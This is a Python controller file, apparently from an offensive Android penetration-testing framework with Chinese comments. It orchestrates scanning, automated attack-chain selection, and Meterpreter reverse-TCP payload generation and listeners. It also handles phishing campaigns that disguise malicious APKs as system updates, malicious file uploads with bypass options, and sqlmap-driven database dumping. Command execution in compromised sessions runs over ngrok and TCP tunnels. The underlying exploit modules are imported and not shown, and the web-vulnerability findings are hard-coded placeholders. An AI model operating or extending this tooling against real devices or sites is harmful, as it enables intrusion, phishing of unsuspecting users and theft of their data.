#!/usr/bin/env python3
# core/main_controller.py
"""
主控制器
负责协调整个Android渗透测试框架的各个模块
"""

import os
import sys
import logging
import time
from pathlib import Path

# 导入核心模块
from core.scanner import Scanner
from core.decision_engine import DecisionEngine
from core.attacker import Attacker
from core.social_engineer import SocialEngineer
from core.payload_generator import PayloadGenerator
from core.file_upload_attacker import FileUploadAttacker
from core.file_upload_detector import FileUploadDetector
from core.ngrok_manager import NgrokManager
from core.sqli_attacker import SQLiAttacker

logger = logging.getLogger(__name__)

class AndroidPentestController:
    def __init__(self, lhost=None, lport=None):
        """初始化控制器。未传入的参数从 config/config.yaml 读取。"""
        import yaml
        try:
            with open('config/config.yaml', 'r', encoding='utf-8') as f:
                _cfg = yaml.safe_load(f).get('metasploit', {})
        except Exception as e:
            logger.error(f"读取配置文件失败: {e}")
            _cfg = {}

        if lhost is None:
            lhost = _cfg.get('default_lhost', '0.0.0.0')
        if lport is None:
            lport = _cfg.get('default_lport', 4444)

        self.lhost = lhost
        self.lport = lport
        self.scanner = None
        self.decision_engine = None
        self.attacker = None
        self.social_engineer = None
        self.payload_generator = None
        self.file_upload_attacker = None
        self.file_upload_detector = None
        self.sqli_attacker = None
        self.ngrok = NgrokManager()
        self.last_intelligence = None  # 缓存最近一次综合扫描情报
        
        # 初始化模块
        self._initialize_modules()
    
    def _initialize_modules(self):
        """初始化各个模块"""
        try:
            # 初始化扫描器
            self.scanner = Scanner()
            logger.info("扫描器初始化成功")
            
            # 初始化决策引擎
            self.decision_engine = DecisionEngine()
            logger.info("决策引擎初始化成功")
            
            # 初始化攻击器
            self.attacker = Attacker(
                lhost=self.lhost,
                lport=self.lport
            )
            logger.info("攻击器初始化成功")
            
            # 初始化社会工程学模块
            self.social_engineer = SocialEngineer(
                lhost=self.lhost,
                lport=self.lport,
                attacker=self.attacker  # 传入attacker以便正确追踪会话
            )
            logger.info("社会工程学模块初始化成功")
            
            # 初始化载荷生成器
            self.payload_generator = PayloadGenerator()
            logger.info("载荷生成器初始化成功")
            
            # 初始化文件上传攻击模块
            self.file_upload_attacker = FileUploadAttacker(
                lhost=self.lhost,
                lport=self.lport
            )
            logger.info("文件上传攻击模块初始化成功")
            
            # 初始化文件上传检测模块
            self.file_upload_detector = FileUploadDetector()
            logger.info("文件上传检测模块初始化成功")
            
            # 初始化SQL注入攻击模块
            self.sqli_attacker = SQLiAttacker()
            logger.info("SQL注入攻击模块初始化成功")
            
        except Exception as e:
            logger.error(f"模块初始化失败: {e}")
    
    def get_system_status(self):
        """获取系统状态"""
        try:
            # 检查ngrok状态
            ngrok_running = False
            ngrok_url = None
            try:
                ngrok_url = self.ngrok.get_public_url()
                ngrok_running = ngrok_url is not None
            except Exception:
                pass
            
            # 检查监听器状态
            listener_running = False
            listener_port = self.lport
            if self.attacker:
                try:
                    listener_status = self.attacker.get_listener_status()
                    listener_running = listener_status.get("running", False)
                    listener_port = listener_status.get("lport", self.lport)
                except Exception:
                    pass
            
            # 统计载荷数量
            payloads_count = 0
            if self.payload_generator:
                try:
                    payloads = self.payload_generator.list_payloads()
                    payloads_count = len(payloads)
                except Exception:
                    pass
            
            # 攻击历史计数
            attack_history_count = 0
            if self.social_engineer and self.social_engineer.attack_active:
                attack_history_count = 1
            
            status = {
                "lhost": self.lhost,
                "lport": self.lport,
                "ngrok_running": ngrok_running,
                "ngrok_url": ngrok_url,
                "listener_running": listener_running,
                "listener_port": listener_port,
                "payloads_count": payloads_count,
                "attack_history_count": attack_history_count,
                "success_rate": 0,
                "modules": {
                    "scanner": self.scanner is not None,
                    "decision_engine": self.decision_engine is not None,
                    "attacker": self.attacker is not None,
                    "social_engineer": self.social_engineer is not None,
                    "payload_generator": self.payload_generator is not None,
                    "file_upload_attacker": self.file_upload_attacker is not None,
                    "file_upload_detector": self.file_upload_detector is not None,
                    "sqli_attacker": self.sqli_attacker is not None
                },
                "msfrpc_available": self.check_msfrpc_status()
            }
            return status
        except Exception as e:
            logger.error(f"获取系统状态失败: {e}")
            return {"error": str(e)}
    
    def scan_target(self, target, scan_type="full"):
        """扫描目标"""
        try:
            if not self.scanner:
                self.scanner = Scanner()
            
            result = self.scanner.scan_target(target, scan_type)
            # 如果是综合扫描，缓存情报数据
            if scan_type == "comprehensive" and result.get("success"):
                self.last_intelligence = result.get("intelligence")
            return result
        except Exception as e:
            logger.error(f"扫描目标失败: {e}")
            return {"success": False, "error": str(e)}

    def comprehensive_scan(self, target: str) -> dict:
        """执行综合扫描并返回结构化情报"""
        try:
            if not self.scanner:
                self.scanner = Scanner()
            result = self.scanner.comprehensive_scan(target)
            if result.get("success"):
                self.last_intelligence = result.get("intelligence")
            return result
        except Exception as e:
            logger.error(f"综合扫描失败: {e}")
            return {"success": False, "error": str(e)}

    def analyze_and_decide(self, intelligence: dict = None, user_preference: str = None) -> dict:
        """调用决策引擎分析情报并推荐攻击链"""
        try:
            if not self.decision_engine:
                self.decision_engine = DecisionEngine()
            
            intel = intelligence or self.last_intelligence
            if not intel:
                return {"success": False, "error": "无可用情报数据，请先执行综合扫描"}
            
            decision = self.decision_engine.analyze_and_decide(intel, user_preference)
            return {"success": True, "decision": decision}
        except Exception as e:
            logger.error(f"决策分析失败: {e}")
            return {"success": False, "error": str(e)}

    def scan_and_decide(self, target: str, user_preference: str = None) -> dict:
        """一键综合扫描 + 智能决策"""
        try:
            scan_result = self.comprehensive_scan(target)
            if not scan_result.get("success"):
                return {"success": False, "error": scan_result.get("error", "扫描失败")}
            
            decision_result = self.analyze_and_decide(
                intelligence=scan_result.get("intelligence"),
                user_preference=user_preference
            )
            return {
                "success": True,
                "scan": scan_result,
                "decision": decision_result.get("decision", {}),
            }
        except Exception as e:
            logger.error(f"扫描决策流程失败: {e}")
            return {"success": False, "error": str(e)}

    def list_attack_chains(self) -> dict:
        """列出所有可用攻击链"""
        try:
            if not self.decision_engine:
                self.decision_engine = DecisionEngine()
            return {"success": True, "chains": self.decision_engine.list_all_chains()}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def generate_payload(self, payload_type="android", **kwargs):
        """生成载荷"""
        try:
            if not self.payload_generator:
                self.payload_generator = PayloadGenerator()
            
            if payload_type == "android":
                result = self.payload_generator.generate_android_payload(
                    lhost=self.lhost,
                    lport=self.lport,
                    **kwargs
                )
            else:
                result = {"success": False, "error": "不支持的载荷类型"}
            
            return result
        except Exception as e:
            logger.error(f"生成载荷失败: {e}")
            return {"success": False, "error": str(e)}
    
    def start_msf_listener(self, payload_type="android/meterpreter/reverse_tcp", lport=None):
        """启动MSF监听器"""
        try:
            if not self.attacker:
                self.attacker = Attacker(
                    lhost=self.lhost,
                    lport=self.lport
                )
            
            result = self.attacker.start_msf_listener(
                payload_type=payload_type,
                lport=lport
            )
            return result
        except Exception as e:
            logger.error(f"启动MSF监听器失败: {e}")
            return {"success": False, "error": str(e)}
    
    def get_sessions(self):
        """获取活跃会话"""
        try:
            if not self.attacker:
                self.attacker = Attacker(
                    lhost=self.lhost,
                    lport=self.lport
                )
            
            sessions = self.attacker.get_sessions()
            return {"success": True, "sessions": sessions}
        except Exception as e:
            logger.error(f"获取会话失败: {e}")
            return {"success": False, "error": str(e)}
    
    def execute_command(self, session_id, command):
        """在会话中执行命令"""
        try:
            if not self.attacker:
                self.attacker = Attacker(
                    lhost=self.lhost,
                    lport=self.lport
                )
            
            result = self.attacker.execute_command(session_id, command)
            return result
        except Exception as e:
            logger.error(f"执行命令失败: {e}")
            return {"success": False, "error": str(e)}
    
    def run_meterpreter_module(self, session_id, module_name, options=None):
        """运行Meterpreter模块"""
        try:
            if not self.attacker:
                self.attacker = Attacker(
                    lhost=self.lhost,
                    lport=self.lport
                )
            
            result = self.attacker.run_meterpreter_module(session_id, module_name, options)
            return result
        except Exception as e:
            logger.error(f"运行模块失败: {e}")
            return {"success": False, "error": str(e)}
    
    def stop_listener(self):
        """停止监听器"""
        try:
            if not self.attacker:
                return {"success": False, "error": "攻击器未初始化"}
            
            result = self.attacker.stop_listener()
            return result
        except Exception as e:
            logger.error(f"停止监听器失败: {e}")
            return {"success": False, "error": str(e)}
    
    def detect_web_vulnerabilities(self, target_url):
        """检测Web漏洞"""
        try:
            logger.info(f"检测Web漏洞: {target_url}")
            
            # 这里可以集成更复杂的Web漏洞扫描逻辑
            # 暂时返回模拟结果
            web_vulnerabilities = [
                {
                    "template_id": "file_upload",
                    "name": "文件上传漏洞",
                    "severity": "high",
                    "confidence": 90,
                    "description": "目标网站可能存在文件上传漏洞，可上传恶意文件",
                    "remediation": "限制上传文件类型，使用白名单验证"
                },
                {
                    "template_id": "xss",
                    "name": "跨站脚本",
                    "severity": "medium",
                    "confidence": 75,
                    "description": "目标网站可能存在XSS漏洞",
                    "remediation": "对用户输入进行适当的转义"
                }
            ]
            
            if web_vulnerabilities:
                top_vuln = web_vulnerabilities[0]
                return {
                    "success": True,
                    "vulnerability": top_vuln,
                    "message": f"发现Web漏洞: {top_vuln.get('template_id')}",
                    "exploit_possible": True
                }
            else:
                return {"success": False, "error": "未发现Web漏洞"}
        except Exception as e:
            logger.error(f"检测Web漏洞失败: {e}")
            return {"success": False, "error": str(e)}
    
    def _file_upload_attack(self, target, architecture="arm", stealth_level="medium",
                           custom_payload_name=None, bypass_technique='none',
                           manual_endpoints=None, verify_upload=False, auto_trigger=True):
        """文件上传攻击（增强版）"""
        logger.info(f"执行文件上传攻击: {target}")
        return self.file_upload_attacker.execute_attack(
            target_url=target,
            architecture=architecture,
            stealth_level=stealth_level,
            custom_payload_name=custom_payload_name,
            bypass_technique=bypass_technique,
            upload_endpoints=manual_endpoints,
            verify_upload=verify_upload,
            auto_trigger=auto_trigger
        )
    
    def scan_upload_endpoints(self, target_url):
        """扫描文件上传端点"""
        try:
            logger.info(f"扫描文件上传端点: {target_url}")
            endpoints = self.file_upload_detector.detect_upload_endpoints(target_url)
            
            # 测试端点功能
            tested_endpoints = []
            for endpoint in endpoints:
                test_result = self.file_upload_detector.test_upload_functionality(endpoint)
                endpoint['test_result'] = test_result
                tested_endpoints.append(endpoint)
            
            return {
                "success": True,
                "target": target_url,
                "endpoints_found": len(tested_endpoints),
                "endpoints": tested_endpoints
            }
            
        except Exception as e:
            logger.error(f"扫描上传端点失败: {e}")
            return {"success": False, "error": str(e)}
    
    def execute_phishing_attack(self, attack_name="Android Security Update", 
                           app_name="System Update", use_gophish=True,
                           stealth_level="medium", architecture="arm",
                           gophish_group=None, gophish_template=None,
                           gophish_page=None, gophish_profile=None,
                           use_apktool=False, template_apk=None, disguise_config=None):
        """执行钓鱼攻击（支持选择GoPhish资源和apktool深度伪装）"""
        try:
            # 确保社会工程模块已初始化
            if not hasattr(self, 'social_engineer') or not self.social_engineer:
                self.social_engineer = SocialEngineer(
                    lhost=self.lhost,
                    lport=self.lport
                )
        
            # 执行钓鱼攻击
            result = self.social_engineer.create_phishing_attack(
                attack_name=attack_name,
                app_name=app_name,
                use_gophish=use_gophish,
                start_listener=True,  # 默认启动监听器
                stealth_level=stealth_level,
                architecture=architecture,
                gophish_group=gophish_group,
                gophish_template=gophish_template,
                gophish_page=gophish_page,
                gophish_profile=gophish_profile,
                use_apktool=use_apktool,
                template_apk=template_apk,
                disguise_config=disguise_config
            )
        
            return result
        
        except Exception as e:
            logger.error(f"执行钓鱼攻击失败: {e}")
            return {"success": False, "error": str(e)}
        
    def check_msfrpc_status(self):
        """检查MSFRPC服务状态"""
        # 如果attacker已有活跃连接，直接返回True
        if self.attacker and self.attacker.msfrpc_client:
            return True

        # 读取配置中的端口
        msfrpc_port = 55553
        try:
            import yaml
            with open('config/config.yaml', 'r', encoding='utf-8') as f:
                msfrpc_port = yaml.safe_load(f).get('metasploit', {}).get('msfrpc_port', 55553)
        except Exception:
            pass

        try:
            import socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex(('127.0.0.1', msfrpc_port))
            sock.close()
            if result == 0:
                # 端口开放，尝试让attacker重新连接
                if self.attacker and self.attacker.msfrpc_client is None:
                    self.attacker.reconnect_msfrpc()
                return self.attacker.msfrpc_client is not None if self.attacker else True
            return False
        except Exception:
            return False
    
    def start_tcp_tunnel(self, port=None):
        """启动TCP隧道（用于Meterpreter）"""
        try:
            if not hasattr(self, 'attacker') or not self.attacker:
                self.attacker = Attacker(
                    lhost=self.lhost,
                    lport=4444
                )
            
            result = self.attacker.start_tcp_tunnel(port=port)
            return result
        except Exception as e:
            logger.error(f"启动TCP隧道失败: {e}")
            return {"success": False, "error": str(e)}
    # ================================================================
    #  SQL注入攻击方法
    # ================================================================
    
    def sqli_detect(self, target_url, method="GET", params=None, data=None, cookie=None):
        """检测SQL注入点"""
        try:
            if not self.sqli_attacker:
                self.sqli_attacker = SQLiAttacker()
            return self.sqli_attacker.detect_injection_points(target_url, method, params, data, cookie)
        except Exception as e:
            logger.error(f"SQL注入检测失败: {e}")
            return {"success": False, "error": str(e)}
    
    def sqli_sqlmap_scan(self, target_url, method="GET", data=None, cookie=None,
                        level=3, risk=2, technique=None, tamper=None, extra_args=None):
        """使用sqlmap扫描"""
        try:
            if not self.sqli_attacker:
                self.sqli_attacker = SQLiAttacker()
            return self.sqli_attacker.run_sqlmap_scan(target_url, method, data, cookie,level, risk, technique, tamper, extra_args)
        except Exception as e:
            logger.error(f"sqlmap扫描失败: {e}")
            return {"success": False, "error": str(e)}
    
    def sqli_get_databases(self, target_url, cookie=None):
        """获取数据库列表"""
        try:
            if not self.sqli_attacker:
                self.sqli_attacker = SQLiAttacker()
            return self.sqli_attacker.sqlmap_get_databases(target_url, cookie)
        except Exception as e:
            logger.error(f"获取数据库失败: {e}")
            return {"success": False, "error": str(e)}
    
    def sqli_get_tables(self, target_url, database, cookie=None):
        """获取表列表"""
        try:
            if not self.sqli_attacker:
                self.sqli_attacker = SQLiAttacker()
            return self.sqli_attacker.sqlmap_get_tables(target_url, database, cookie)
        except Exception as e:
            logger.error(f"获取表列表失败: {e}")
            return {"success": False, "error": str(e)}
    
    def sqli_get_columns(self, target_url, database, table, cookie=None):
        """获取列信息"""
        try:
            if not self.sqli_attacker:
                self.sqli_attacker = SQLiAttacker()
            return self.sqli_attacker.sqlmap_get_columns(target_url, database, table, cookie)
        except Exception as e:
            logger.error(f"获取列信息失败: {e}")
            return {"success": False, "error": str(e)}
    
    def sqli_dump_data(self, target_url, database, table, columns=None, cookie=None, limit=50):
        """提取数据"""
        try:
            if not self.sqli_attacker:
                self.sqli_attacker = SQLiAttacker()
            return self.sqli_attacker.sqlmap_dump_data(target_url, database, table, columns, cookie, limit)
        except Exception as e:
            logger.error(f"数据提取失败: {e}")
            return {"success": False, "error": str(e)}
    
    def sqli_test_payload(self, target_url, method, param_name, payload, params=None, cookie=None):
        """测试自定义payload"""
        try:
            if not self.sqli_attacker:
                self.sqli_attacker = SQLiAttacker()
            return self.sqli_attacker.test_custom_payload(target_url, method, param_name, payload, params, cookie)
        except Exception as e:
            logger.error(f"payload测试失败: {e}")
            return {"success": False, "error": str(e)}
    
    def sqli_get_payloads(self):
        """获取常用payload列表"""
        try:
            if not self.sqli_attacker:
                self.sqli_attacker = SQLiAttacker()
            return {"success": True, "payloads": self.sqli_attacker.get_common_payloads()}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def sqli_get_tampers(self):
        """获取tamper脚本列表"""
        try:
            if not self.sqli_attacker:
                self.sqli_attacker = SQLiAttacker()
            return {"success": True, "tampers": self.sqli_attacker.get_tamper_scripts()}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def get_tcp_tunnel_info(self):
        """获取TCP隧道信息"""
        try:
            if not hasattr(self, 'attacker') or not self.attacker:
                return {"success": False, "error": "攻击器未初始化"}
            
            info = self.attacker.get_tcp_tunnel_info()
            return {"success": True, "info": info}
        except Exception as e:
            logger.error(f"获取TCP隧道信息失败: {e}")
            return {"success": False, "error": str(e)}
    
    def stop_tcp_tunnel(self):
        """停止TCP隧道"""
        try:
            if not hasattr(self, 'attacker') or not self.attacker:
                return {"success": False, "error": "攻击器未初始化"}
            
            result = self.attacker.stop_tcp_tunnel()
            return result
        except Exception as e:
            logger.error(f"停止TCP隧道失败: {e}")
            return {"success": False, "error": str(e)}
